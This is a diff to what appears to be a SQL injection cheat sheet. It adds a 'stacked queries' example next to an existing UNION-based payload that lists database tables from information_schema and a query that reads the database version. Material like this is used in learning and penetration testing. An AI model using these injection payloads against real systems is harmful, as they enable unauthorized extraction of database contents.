@@ -43,6 +43,14 @@ SELECT name,issue_date,valid_until FROM tickets WHERE ticket_id="
 - 1" UNION SELECT 1,GROUP_CONCAT(table_name SEPARATOR "<br>") ,3 FROM information_schema.tables /*
 "
 ```
+
+### stacked queries
+```diff
+SELECT * FROM users WHERE id='
+-1'||'SELECT * FROM dual
+'
+```
+
 # Version enumeration
 ```
 SELECT version() # PostgreSQL / MySQL / MariaDB
